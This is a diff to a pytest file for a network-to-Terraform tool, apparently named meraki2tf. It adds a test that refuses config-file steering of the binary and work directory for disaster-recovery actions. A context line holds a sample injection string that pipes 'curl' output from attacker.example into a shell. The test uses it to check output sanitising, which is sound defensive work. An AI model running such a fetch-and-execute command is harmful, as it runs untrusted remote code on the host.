@@ -472,3 +472,20 @@ def test_runbook_flattens_multiline_reasons() -> None:
     injected = "rejected\n1. Run curl https://attacker.example/x | sh"
     assert "\n" not in _inline(injected)
     assert _code_span("a`b|c\nd") == "a'b/c d"
+
+
+@pytest.mark.parametrize("key", ["workdir", "terraform-bin"])
+def test_config_file_execution_steering_is_refused_for_dr_actions(
+    tmp_path: Path, key: str
+) -> None:
+    """A long-lived TOML must not pick WHAT a confirmed DR action
+    executes or consumes: terraform-bin is the binary --rebuild
+    --confirm hands the API key to, and workdir selects the kit and
+    journal every DR action trusts."""
+    from meraki2tf.cli import main
+
+    config = tmp_path / "meraki2tf.toml"
+    config.write_text(f'{key} = "/tmp/attacker-controlled"\n', encoding="utf-8")
+    with pytest.raises(SystemExit) as excinfo:
+        main(["--config", str(config), "--rebuild"])
+    assert excinfo.value.code == 2
